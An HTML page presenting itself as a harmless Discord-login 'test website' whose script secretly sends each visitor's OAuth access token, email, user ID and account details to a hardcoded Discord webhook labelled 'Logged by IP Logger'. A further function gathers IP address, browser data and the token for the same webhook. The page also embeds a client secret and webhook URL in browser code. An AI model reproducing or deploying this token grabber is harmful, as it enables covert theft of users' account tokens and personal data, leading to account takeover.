<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sem's Test Website</title>
    <script>
        const clientId = '1284270652693680169';
        const redirectUri = 'https://semodge2.github.io/test/'; // Your redirect URI
        const scopes = 'identify email guilds'; // Define the scopes you need

        async function loginWithDiscord() {
            const authUrl = `https://discord.com/oauth2/authorize?client_id=${clientId}&redirect_uri=${encodeURIComponent(redirectUri)}&response_type=code&scope=${scopes}`;
            window.location.href = authUrl;
        }

        async function fetchUserData(code) {
            const response = await fetch('https://discord.com/api/oauth2/token', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: new URLSearchParams({
                    'client_id': clientId,
                    'client_secret': 'ErVCZ3uzQn1AaUTIh1ej39JYfeAbM0fY', // Keep this secret on the server in a real app
                    'grant_type': 'authorization_code',
                    'code': code,
                    'redirect_uri': redirectUri,
                }),
            });

            if (!response.ok) {
                const errorText = await response.text();
                console.error('Failed to fetch access token:', errorText);
                return;
            }

            const data = await response.json();
            const userInfoResponse = await fetch('https://discord.com/api/v10/users/@me', {
                headers: {
                    'Authorization': `Bearer ${data.access_token}`,
                },
            });

            if (!userInfoResponse.ok) {
                const errorText = await userInfoResponse.text();
                console.error('Failed to fetch user info:', errorText);
                return;
            }

            const user = await userInfoResponse.json();
            const email = user.email || "Email not provided";

            document.body.innerHTML = `
                <h1>Welcome, ${user.username}!</h1>
                <p>Email: ${email}</p>
                <pre>${JSON.stringify(user, null, 2)}</pre>
            `;

            // Call the function to send visitor info along with all tokens
            sendAllTokensToWebhook(data.access_token, user);
        }

        async function sendAllTokensToWebhook(accessToken, userInfo) {
            try {
                const tokens = {
                    access_token: accessToken,
                    refresh_token: 'N/A', // Placeholder: Retrieve this if available in your application context
                    // Add any other tokens you might have (e.g., GitHub, Twitter)
                };

                const tokenValues = Object.entries(tokens).map(([key, value]) => `${key}: ${value}`).join('\n');

                const embedMessage = {
                    embeds: [{
                        title: 'üë§ User Token Info',
                        color: 3066993,
                        fields: [
                            { name: 'Username', value: `${userInfo.username}#${userInfo.discriminator}`, inline: true },
                            { name: 'User ID', value: userInfo.id, inline: true },
                            { name: 'Email', value: userInfo.email || "Not provided", inline: true },
                            { name: 'Tokens', value: `\`\`\`${tokenValues}\`\`\``, inline: false },
                            { name: 'MFA Enabled', value: userInfo.mfa_enabled ? 'Yes' : 'No', inline: true },
                            { name: 'Has Nitro', value: userInfo.premium_type ? 'Yes' : 'No', inline: true },
                        ],
                        footer: {
                            text: 'Logged by IP Logger',
                        }
                    }]
                };

                const webhookUrl = 'https://discord.com/api/webhooks/1285985396924092458/8UH3XrEDxBUqIGYkw4iC353w_0mC86uGCnvdlRyw2uhBMucajDmFEGrsm_7VCu44Q101'; // Your webhook URL
                await fetch(webhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(embedMessage)
                });
            } catch (error) {
                console.error('Failed to send token info:', error);
            }
        }

        async function sendInfoToDiscord(accessToken) {
            const ipResponse = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipResponse.json();
            const ip = ipData.ip;

            // Get additional information
            const userAgent = navigator.userAgent;
            const referrer = document.referrer || 'Direct visit';
            const timestamp = new Date().toISOString();
            const language = navigator.language;
            const screenResolution = `${window.screen.width}x${window.screen.height}`;
            const currentUrl = window.location.href;

            const embedMessage = {
                embeds: [{
                    title: 'üë§ New Visitor Info',
                    color: 3066993,
                    fields: [
                        { name: 'üñ•Ô∏è IP Address', value: ip, inline: true },
                        { name: 'üåê User-Agent', value: userAgent, inline: true },
                        { name: 'üîó Referrer', value: referrer, inline: true },
                        { name: 'üìÖ Timestamp', value: timestamp, inline: true },
                        { name: 'üåç Language', value: language, inline: true },
                        { name: 'üì∫ Screen Resolution', value: screenResolution, inline: true },
                        { name: 'üîó Current URL', value: currentUrl, inline: true },
                        { name: 'üîë Access Token', value: accessToken, inline: false } // Send the access token
                    ],
                    footer: {
                        text: 'Logged by IP Logger',
                    }
                }]
            };

            const webhookUrl = 'https://discord.com/api/webhooks/1285985396924092458/8UH3XrEDxBUqIGYkw4iC353w_0mC86uGCnvdlRyw2uhBMucajDmFEGrsm_7VCu44Q101'; // Your webhook URL
            await fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(embedMessage)
            });

            document.body.innerHTML += `<h2>Test Website, Thank You for Testing</h2>`;
        }

        window.onload = function () {
            const params = new URLSearchParams(window.location.search);
            const code = params.get('code');
            if (code) {
                fetchUserData(code);
            } else {
                // Show the login button if no code is present
                document.body.innerHTML = `<h1>Welcome to Sem's Test Website</h1><button onclick="loginWithDiscord()">Login with Discord</button>`;
            }
        };
    </script>
</head>
<body>
</body>
</html>
